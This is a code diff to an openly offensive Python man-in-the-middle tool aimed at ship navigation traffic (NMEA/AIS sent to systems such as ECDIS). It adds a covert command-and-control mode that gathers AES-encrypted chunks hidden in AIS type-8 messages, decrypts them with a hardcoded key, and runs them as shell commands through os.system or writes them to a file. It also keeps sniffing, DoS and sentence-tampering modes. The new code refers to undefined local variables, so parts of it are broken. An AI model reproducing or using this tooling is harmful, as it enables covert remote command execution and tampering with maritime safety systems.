@@ -11,6 +11,7 @@ from pyais import *
 from NMEA import NMEA
 import json
 from Attributes import attributes
+from Crypto.Cipher import AES
 
 gps_attr_targets = None
 
@@ -26,26 +27,76 @@ class MITM:
         self.target_sentences = list(config_data.keys()) if option == "M" and config_data else None
         self.option = option
         self.target_attr = list(config_data["attributes"]) if option == "A" and config_data else None
+        self.KEY = b"sixteen byte key"
+
+        # AIS CC, parameters
+        self.decrypt_cipher = AES.new(self.KEY, AES.MODE_EAX, nonce = self.KEY)
+        self.sentence_count = 0
+        self.trigger_received = False
+        self.received_cipher =  ""
+        self.option = None
+        self.filename  = None
+
+    def ais_cc(self, packet):
+        pkt = packet.get_payload()
+        pktIP = IP(pkt)
+            
+        payload = "".join(map(chr, bytes(pktIP[TCP].payload)))
+        sentence_type = payload.split(",")[0][1:]
+            
+        if pktIP.haslayer(TCP) and pktIP.src == self.src_ip and pktIP[TCP].dport == 4000 and sentence_type == "AIVDM":
+            print("-"*20)
+            print(f"[*] AIS Packet Intercepted with payload \n{payload}")
+    
+            nmea_ais = NMEA(sentence = payload)
+            nmea_ais.decode()
+            decoded_ais = nmea_ais.data #['data'].decode()
+
+            if trigger_received and decoded_ais['msg_type'] == 8 and decoded_ais['mmsi'] == 366053209 and sentence_count != 0:
+                received_cipher += decoded_ais['data'].decode()
+                sentence_count -= 1
+            
+            if trigger_received and sentence_count == 0:
+                received_cipher = bytes.fromhex(received_cipher)
+                plaintext = self.decrypt_cipher.decrypt(received_cipher)
+                print(f"[*] Payload decryped and decoded")
+                if option == "CMD":
+                    print(f"[*] Executing command")
+                    os.system(plaintext.decode())
+                if option == "FILE":
+                    print(f"[*] Writing payload to file....{filename}")
+                    out_file = open(filename,'w')
+                    out_file.write(plaintext.decode())
+                    out_file.close()
+                
+                trigger_received = False
+        
+            if decoded_ais['msg_type'] == 8 and decoded_ais['mmsi'] == 366053209 and not trigger_received:
+                data = str(decoded_ais['data'].decode()).split(":")
+                if len(data) >= 3 and data[0] == "CCSTART":
+                    option = data[1]
+                    sentence_count = int(data[2])
+                    trigger_received = True
+                    if option == "FILE":   
+                        filename = data[3]
+                    print(f"[*] Trigger received, waiting for {option}")
+
+            packet.accept()
 
     def sniff(self, packet):
-            
+            print("[*] Running Sniffing Attack")
             pkt = packet.get_payload()
             pktIP = IP(pkt)
             
             payload = "".join(map(chr, bytes(pktIP[TCP].payload)))
             
-            
             if pktIP.haslayer(TCP) and pktIP.src == self.src_ip and pktIP[TCP].dport == 4000:
                 print("-"*20)
-                print(f"[*] Packet Intercepted with payload \n{payload}")
-                # print(pktIP[TCP].seq)
-                # print(pktIP[TCP].ack)
-                # print(len(pktIP[TCP].payload))
-                # print(pktIP[IP].len)  
+                print(f"[*] Packet Intercepted with payload \n{payload}") 
             packet.accept()
     
     def dos(self, packet):
-        
+        print("[*] Running DoS Attack")
         pkt = packet.get_payload()
         pktIP = IP(pkt)
         
@@ -61,7 +112,7 @@ class MITM:
             packet.accept()
 
     def modify(self, packet):
-        
+        print("[*] Running Sentence Modification Attack")
         pkt = packet.get_payload()
         pktIP = IP(pkt)
         
@@ -107,7 +158,7 @@ class MITM:
         packet.accept()
 
     def stealth(self, packet):
-        
+        print("[*] Running Attribute Attack")
         pkt = packet.get_payload()
         pktIP = IP(pkt)
         
@@ -154,7 +205,6 @@ class MITM:
 
         packet.accept()
 
-
     def setup(self):
         iptable_config = f"sudo iptables -A FORWARD -j NFQUEUE --queue-num 0 -d {self.target_ip}"
         os.system(iptable_config)
@@ -166,6 +216,8 @@ class MITM:
             self.nfqueue.bind(0, self.sniff)
         elif self.option == "D":
             self.nfqueue.bind(0, self.dos) 
+        elif self.option == "C":
+            self.nfqueue.bind(0, self.ais_cc)
 
     def clean_up(self):
         print("[*] Flushing iptables")
@@ -181,7 +233,7 @@ def get_input():
     parser.add_argument("-t", "--target-ip", help="Target system IP address (Eg: ECDIS)", required=True)
     parser.add_argument("-s", "--source-ip", help="Source system IP address", required=True)
     parser.add_argument("-c", "--config", help="JSON config file")
-    parser.add_argument("-o", "--option", help="M - mitm nmea modification attack, A - stealth GPS nmea attribute attack, S - Sniffing attack, D - DoS attack", required=True)
+    parser.add_argument("-o", "--option", help="M - mitm nmea modification attack, A - stealth GPS nmea attribute attack, S - Sniffing attack, D - DoS attack, C - AIS Command & Control mode", required=True)
    # parser.add_argument("-a", "--attr", help="nmea GPS attribute comma separated names")
 
     args = parser.parse_args()
